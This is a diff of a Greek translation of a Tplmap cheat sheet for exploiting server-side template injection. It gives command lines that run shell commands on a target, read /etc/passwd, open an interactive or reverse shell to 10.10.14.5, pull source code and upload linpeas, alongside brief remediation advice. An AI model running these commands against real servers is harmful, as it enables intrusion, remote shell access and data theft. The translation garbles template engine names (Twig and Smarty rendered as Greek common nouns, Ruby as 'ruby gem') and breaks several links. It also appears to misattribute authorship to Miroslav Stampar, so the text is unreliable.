@@ -1,12 +1,16 @@
-# 🎭 Tplmap — Πλήρης οδηγός αναφοράς
-
 <!-- language-home-navigation -->
-[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🎭 Tplmap - Πλήρες φύλλο εξαπάτησης
 
+[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
 ```
   ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
   ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
@@ -16,7 +20,6 @@
      ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
        Server-Side Template Injection (SSTI) Automated Exploiter
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
   <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="Web Security & API">
@@ -25,52 +28,51 @@
 </p>
 
 <p align="center">
-  <b>🌐 Automated exploitation tool designed to detect and exploit Server-Side Template Injection (SSTI) vulnerabilities to achieve Remote Code Execution</b>
+  <b>🌐 Εργαλείο αυτοματοποιημένης εκμετάλλευσης που έχει σχεδιαστεί για να ανιχνεύει και να εκμεταλλεύεται τις ευπάθειες του Server-Side Template Injection (SSTI) για την επίτευξη απομακρυσμένης εκτέλεσης κώδικα</b>
 </p>
 
 ---
 
 ## 📋 Πίνακας περιεχομένων
 
-- [Εισαγωγή](#-overview--the-ssti-vulnerability)
-- [Supported Template Engines](#-supported-template-engines)
-- [Εγκατάσταση](#-installation)
+- [Επισκόπηση και ευπάθεια SSTI](#-επισκόπηση--the-ssti-vulnerability)
+- [Υποστηριζόμενες μηχανές προτύπων] (#-supported-template-engines)
+- [Εγκατάσταση] (#-εγκατάσταση)
 - [Basic Vulnerability Detection](#-basic-vulnerability-detection)
-- [Targeting Specific Injection Points (`*` marker)](#-targeting-specific-injection-points--marker)
-- [Remote Command Execution (`--os-cmd`)](#-remote-command-execution---os-cmd)
+- [Targeting Specific Injection Points (δείκτης `*`)] (#-targeting-specific-injection-points--marker)
+- [Εκτέλεση απομακρυσμένης εντολής (`--os-cmd`)](#-απομακρυσμένη εντολή-εκτέλεση---os-cmd)
 - [Interactive Shells & Reverse Connections](#-interactive-shells--reverse-connections)
-- [File Upload & Download](#-file-upload--download)
-- [Testing POST Data & Headers](#-testing-post-data--headers)
-- [Γρήγορη αναφορά](#-quick-reference-table)
+- [Μεταφόρτωση και λήψη αρχείου](#-αρχείο-μεταφόρτωση--λήψη)
+- [Δοκιμή δεδομένων και κεφαλίδων POST](#-testing-post-data--headers)
+- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
 - [Defensive Considerations & Remediation](#-defensive-considerations--remediation)
-- [Legal Disclaimer](#-legal-disclaimer)
+- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)
 
 ---
 
-## 🎯 Εισαγωγή
+## 🎯 Επισκόπηση & Η ευπάθεια SSTI
 
-**Server-Side Template Injection (SSTI)** occurs when an application embeds unvalidated user input directly into a server-side template rather than passing it as data to be rendered. Because modern template engines allow syntax like `{{7*7}}` or `${7*7}`, attackers can break out of the sandbox and access the underlying runtime environment (Python, Java, PHP, Ruby, Node.js).
+**Η Έγχυση προτύπου από την πλευρά του διακομιστή (SSTI)** πραγματοποιείται όταν μια εφαρμογή ενσωματώνει μη επικυρωμένα στοιχεία χρήστη απευθείας σε ένα πρότυπο από την πλευρά του διακομιστή αντί να τα μεταβιβάζει ως δεδομένα προς απόδοση. Επειδή οι σύγχρονες μηχανές προτύπων επιτρέπουν σύνταξη όπως το `{{7*7}}` ή το `${7*7}`, οι εισβολείς μπορούν να ξεφύγουν από το sandbox και να αποκτήσουν πρόσβαση στο υποκείμενο περιβάλλον χρόνου εκτέλεσης (Python, Java, PHP, Ruby, Node.js).
 
-Written by **Miroslav Stampar** and **Emilio Pinna**, **Tplmap** acts as the "SQLMap for Template Engines". It automatically fingerprints the active template engine, breaks out of template evaluation contexts, and escalates code execution to full OS-level shell access.
+Γραμμένο από τους **Miroslav Stampar** και **Emilio Pinna**, το **Tplmap** λειτουργεί ως "SQLMap για μηχανές προτύπων". Αποτυπώνει αυτόματα δακτυλικά αποτυπώματα στον ενεργό κινητήρα προτύπου, ξεφεύγει από τα πλαίσια αξιολόγησης προτύπων και κλιμακώνει την εκτέλεση κώδικα σε πλήρη πρόσβαση σε επίπεδο κελύφους λειτουργικού συστήματος.
 
 ---
 
-## 🧩 Supported Template Engines
+## 🧩 Υποστηριζόμενες μηχανές προτύπων
 
-|Language|Template Engines Supported|
+| Γλώσσα | Υποστηριζόμενες μηχανές προτύπων |
 |----------|----------------------------|
-|**Python**|Jinja2, Mako, Tornado, Nunjucks|
-|**PHP**|Twig, Smarty|
-|**Java**|Freemarker, Velocity|
-|**Ruby**|ERB, Slim|
-|**Node.js**|Jade, Pug, Dust.js|
+| **Python** | Jinja2, Mako, Tornado, Nunjucks |
+| **PHP** | Κλαδί, Έξυπνο |
+| ** Java ** | Freemarker, Velocity |
+| **Ρουμπίνι** | ERB, Slim |
+| **Node.js** | Jade, Pug, Dust.js |
 
 ---
 
 ## 📥 Εγκατάσταση
 
-|**Node.js**|Jade, Pug, Dust.js|
-
+Το Tplmap είναι χτισμένο σε Python:
 ```bash
 # Clone GitHub repository
 git clone https://github.com/epinna/tplmap.git
@@ -82,11 +84,9 @@ pip install -r requirements.txt
 # Verify installation
 python tplmap.py --help
 ```
-
 ---
 
-## 🚀 Basic Vulnerability Detection
-
+## 🚀 Βασικός εντοπισμός ευπάθειας
 ```bash
 # Scan a GET parameter for SSTI
 python tplmap.py -u "http://target.local/page?name=John"
@@ -94,13 +94,11 @@ python tplmap.py -u "http://target.local/page?name=John"
 # Mark explicit injection point using an asterisk (*)
 python tplmap.py -u "http://target.local/profile?id=1&bio=*"
 ```
-
 ---
 
-## 💻 Remote Command Execution (`--os-cmd`)
+## 💻 Εκτέλεση απομακρυσμένης εντολής (`--os-cmd`)
 
-Once Tplmap detects the engine (e.g., Jinja2), execute arbitrary shell commands directly:
-
+Μόλις το Tplmap εντοπίσει τον κινητήρα (π.χ. Jinja2), εκτελέστε αυθαίρετες εντολές φλοιού απευθείας:
 ```bash
 # Execute whoami on target
 python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"
@@ -108,11 +106,9 @@ python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"
 # Read sensitive configuration files
 python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
 ```
-
 ---
 
-## 💀 Interactive Shells & Reverse Connections
-
+## 💀 Διαδραστικά κελύφη & αντίστροφες συνδέσεις
 ```bash
 # Spawn an interactive pseudo-terminal within Tplmap
 python tplmap.py -u "http://target.local/page?name=*" --os-shell
@@ -121,13 +117,11 @@ python tplmap.py -u "http://target.local/page?name=*" --os-shell
 python tplmap.py -u "http://target.local/page?name=*" \
   --reverse-shell 10.10.14.5 4444
 ```
-
 ---
 
-## 📁 File Upload & Download
+## 📁 Μεταφόρτωση και λήψη αρχείου
 
-Exfiltrate source code or upload persistence tools:
-
+Εξαγωγή πηγαίου κώδικα ή μεταφόρτωση εργαλείων επιμονής:
 ```bash
 # Download remote source code or configuration
 python tplmap.py -u "http://target.local/page?name=*" \
@@ -137,11 +131,9 @@ python tplmap.py -u "http://target.local/page?name=*" \
 python tplmap.py -u "http://target.local/page?name=*" \
   --upload ./linpeas.sh /tmp/linpeas.sh
 ```
-
 ---
 
-## 🌐 Testing POST Data & Headers
-
+## 🌐 Δοκιμή δεδομένων και κεφαλίδων POST
 ```bash
 # Test POST body parameters
 python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"
@@ -152,31 +144,30 @@ python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"
 # Test behind authenticated session cookies
 python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
 ```
-
 ---
 
-## ⚡ Γρήγορη αναφορά
+## ⚡ Γρήγορος Πίνακας Αναφοράς
 
-|Objective|Εντολή|
+| Στόχος | Εντολή |
 |-----------|---------|
-|**Detect SSTI in URL**|`python tplmap.py -u "<URL>?param=*"`|
-|**Execute Remote Command**|`python tplmap.py -u "<URL>" --os-cmd="<CMD>"`|
-|**Interactive Terminal**|`python tplmap.py -u "<URL>" --os-shell`|
-|**Drop Reverse Shell**|`python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>`|
-|**Download Remote File**|`python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>`|
-|**Upload Local File**|`python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>`|
-|**Test POST Body**|`python tplmap.py -u "<URL>" -d "data=*"`|
+| **Εντοπισμός SSTI στη διεύθυνση URL** | `python tplmap.py -u "<URL>?param=*"` |
+| **Εκτέλεση απομακρυσμένης εντολής** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
+| **Διαδραστικό τερματικό** | `python tplmap.py -u "<URL>" --os-shell` |
+| **Ρίξτε το αντίστροφο κέλυφος** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
+| **Λήψη Απομακρυσμένου αρχείου** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
+| **Μεταφόρτωση τοπικού αρχείου** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
+| **Δοκιμή POST Body** | `python tplmap.py -u "<URL>" -d "data=*"` |
 
 ---
 
-## 🛡️ Defensive Considerations & Remediation
+## 🛡️ Αμυντικές Θεωρήσεις & Αποκατάσταση
 
-1. **Context-Aware Escaping:** Never concatenate raw user input into template strings. Use the template engine's native variable binding mechanism (e.g., in Jinja2: `render_template('hello.html', name=user_input)` rather than `render_template_string(f"Hello {user_input}")`).
-2. **Sandbox Restrictions:** Enforce strict sandboxing within engines where dynamic rendering is unavoidable, disallowing access to `__class__`, `__mro__`, or reflection objects.
+1. **Context-Aware Escapeing:** Ποτέ μη συνενώνετε την ακατέργαστη είσοδο χρήστη σε συμβολοσειρές προτύπων. Χρησιμοποιήστε τον εγγενή μηχανισμό δέσμευσης μεταβλητής της μηχανής προτύπου (π.χ. σε Jinja2: `render_template('hello.html', name=user_input)` αντί `render_template_string(f"Hello {user_input}")`).
+2. **Περιορισμοί Sandbox:** Επιβολή αυστηρού sandbox σε μηχανές όπου η δυναμική απόδοση είναι αναπόφευκτη, απαγορεύοντας την πρόσβαση σε `__class__`, `__mro__` ή αντικείμενα ανάκλασης.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Νομική αποποίηση ευθύνης
 
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> Tplmap executes arbitrary remote code on target application servers. Testing or exploiting web applications without prior written authorization is strictly illegal.
+> [!ΠΡΟΣΟΧΗ]
+> Το Tplmap εκτελεί αυθαίρετο απομακρυσμένο κώδικα σε διακομιστές εφαρμογών προορισμού. Η δοκιμή ή η εκμετάλλευση διαδικτυακών εφαρμογών χωρίς προηγούμενη γραπτή εξουσιοδότηση είναι αυστηρά παράνομη.
